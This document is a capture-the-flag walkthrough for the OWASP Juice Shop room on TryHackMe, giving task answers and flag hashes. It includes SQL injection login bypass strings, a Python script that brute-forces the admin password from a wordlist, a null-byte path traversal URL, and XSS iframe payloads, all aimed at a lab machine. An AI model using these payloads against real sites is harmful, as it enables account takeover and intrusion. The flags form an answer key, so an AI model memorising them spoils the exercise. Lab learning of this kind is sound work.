# OWASP Juice Shop - TryHackMe

This room uses the Juice Shop vulnerable web application to learn how to identify and exploit common web application vulnerabilities.

## Overview

- **Room URL:** [https://tryhackme.com/room/owaspjuiceshop](https://tryhackme.com/room/owaspjuiceshop)
- **Difficulty:** Easy
- **Time to complete:** 120

## Walkthrough

### 1. Open for business!

_No answer needed!_

### 2. Let's go on an adventure!

- Question #1: What's the Administrator's email address?

**=> Answer: `admin@juice-sh.op`**

- Question #2: What parameter is used for searching?

**=> Answer: `q`**

- Question #3: What show does Jim reference in his review?

**=> Answer: `Star Trek`**

### 3. Inject the juice

- Question #1: Log into the administrator account!

```
Using Burp Suite, change the email value to: "' OR 1=1 --" and forward
```

![Guide image](./screenshots/owasp-juice-shop-1.png)

**=> Answer: `690fa3247a99d651e0b26f947baf0b79b4f404a9`**

- Question #2: Log into the Bender account!

```
Use Burp Suite change the email to "bender@juice-sh.op'--" and forward
```

![Guide image](./screenshots/owasp-juice-shop-2.png)

**=> Answer: `5ff5052e879e6fef64124e64c82c84ebc809c6c4`**

### 4. Who broke my lock?!

- Question #1: Bruteforce the Administrator account's password!
- Instead of using Burp Suite, I create my `exploit.py`, if you doesn't have `best1050.txt` pass list, download here: https://weakpass.com/wordlists/best1050.txt. My Python script:

```python
import requests


target_url = "http://10.49.170.180/rest/user/login"


with open('.../best1050.txt', 'r') as file:
   for line in file:
       passw = line.strip()
       print('Tried ', passw)
       res = requests.post(target_url, data={"email": "admin@juice-sh.op", "password": passw})


       if "Invalid email or password." not in res.text:
           print()
           print("found pass: ", passw)
           print(res.text)
           break
```

![Guide image](./screenshots/owasp-juice-shop-3.png)

**=> Answer: `ff4aebffe31b0ffdea9bdd0207a16a3c01ac6c56`**

- Question #2: Reset Jim's password!
- Follow the instructions and get the flag.

![Guide image](./screenshots/owasp-juice-shop-4.png)

**=> Answer: `3c3e2d6ef99b733b947e92f8e2a9ed08bf57ea63`**

### 5. AH! Don't look!

- Question #1: Access the Confidential Document!

**=> Answer: `8d2072c6b0a455608ca1a293dc0c9579883fc6a5`**

- Question #2: Log into MC SafeSearch's account!
- Login with `mc.safesearch@juice-sh.op` and `Mr.N00dles`

**=> Answer: `bb105418e73708ceccf1a7b2491f434b8f5230e4`**

- Question #3: Download the Backup file!
- Visit `http://<MACHINE_IP>/ftp/package.json.bak%2500.md`

**=> Answer: `cfdeea14e8f01b4952722fd0e4a77f1928593c9a`**

### 6. Who's flying this thing?

- Question #1: Access the administration page!
- First login as `admin@juice-sh.op` with the password we found, visit `/#/administration`

![Guide image](./screenshots/owasp-juice-shop-5.png)

**=> Answer: `71aeb3b0bf01cc6e488f0207bb62f79b41454a87`**

- Question #2: View another user's shopping basket!

**=> Answer: `e6982b34b6734ceadd28e5019b251f929a80b815`**

- Question #3: Remove all 5-star reviews!

**=> Answer: `78231b75c0b2180b7e964dcbb1ab3c3f58639f2e`**

### 7. Where did that come from?

- Question #1: Perform a DOM XSS!
- Search the term:

```html
<iframe src="javascript:alert('xss')"></iframe>
```

**=> Answer: `4a31a4fe0954199566e360a873802bf64d0d0a84`**

- Question #2: Perform a persistent XSS!
- Intercept the logout request and add a new header `True-Client-IP`: `<iframe ...`
  **=> Answer: `c37da14686b69a220fd9febd09bb9593e7d0539f`**

- Question #3: Perform a reflected XSS!

**=> Answer: `305021787d3e9cd9cebc057a021c2504550bb3b6`**

### 8. Exploration!

- Access the /#/score-board/ page

**=> Answer: `2614339936e8282e2f820f023d4d998a1f95e02a`**
